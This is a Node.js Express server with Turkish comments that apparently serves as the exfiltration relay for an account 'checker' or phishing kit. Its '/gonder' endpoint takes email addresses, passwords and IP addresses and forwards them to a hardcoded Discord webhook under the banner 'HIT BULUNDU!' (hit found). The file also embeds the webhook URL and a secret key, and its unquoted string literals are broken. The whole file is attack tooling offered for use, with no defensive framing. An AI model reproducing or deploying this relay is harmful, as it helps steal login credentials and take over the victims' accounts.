const express = require('express');
const fetch = require('node-fetch').default;

const app = express();
app.use(express.json({ limit: '1mb' }));

// Environment variables (Render dashboard'dan ekle)
const DISCORD_WEBHOOK = https://discord.com/api/webhooks/1484452545714851962/qduzDkY1R_7Xma7NPSw7VG9O_WPlWndGdgT1Lerl-5GAqf0bTbmrcJUtLoVSwsCmTLcA;
const SECRET_KEY = f8d9a2b3c4e5f6g8h9j0k1l2m3n4o5p_qwertyuiopasdfghjklzxcvbnm;  // güçlü bir secret koy (32+ karakter)

if (!DISCORD_WEBHOOK || !SECRET_KEY) {
  console.error('DISCORD_WEBHOOK_URL veya SECRET_KEY eksik!');
  process.exit(1);
}

app.post('/gonder', async (req, res) => {
  const { secret, email, pass, zaman, ip } = req.body;

  // Secret doğrulaması – yanlış secret ile gelen istekleri engeller
  if (secret !== SECRET_KEY) {
    return res.status(403).json({ error: 'Yetkisiz' });
  }

  if (!email || !pass) {
    return res.status(400).json({ error: 'Eksik veri' });
  }

  // Discord mesajı (embed'li, güzel görünüm)
  const payload = {
    content: '**HIT BULUNDU!** 🚨',
    embeds: [{
      title: 'Yeni Geçerli Hesap',
      description: `**Email:** \`${email}\`\n**Şifre:** \`${pass}\``,
      color: 0x00FF00,
      fields: [
        { name: 'Zaman', value: zaman || new Date().toLocaleString('tr-TR'), inline: true },
        { name: 'IP', value: ip || req.ip || 'Bilinmiyor', inline: true }
      ],
      timestamp: new Date().toISOString(),
      footer: { text: 'Checker • 2026' }
    }]
  };

  try {
    const resp = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!resp.ok) {
      throw new Error(`Discord yanıtı: ${resp.status}`);
    }

    res.json({ durum: 'gönderildi' });
  } catch (err) {
    console.error('Hata:', err.message);
    res.status(500).json({ error: 'Sunucu sorunu' });
  }
});

// Render sağlık kontrolü
app.get('/', (req, res) => res.send('Proxy aktif'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Proxy çalışıyor → ${PORT}`);
});
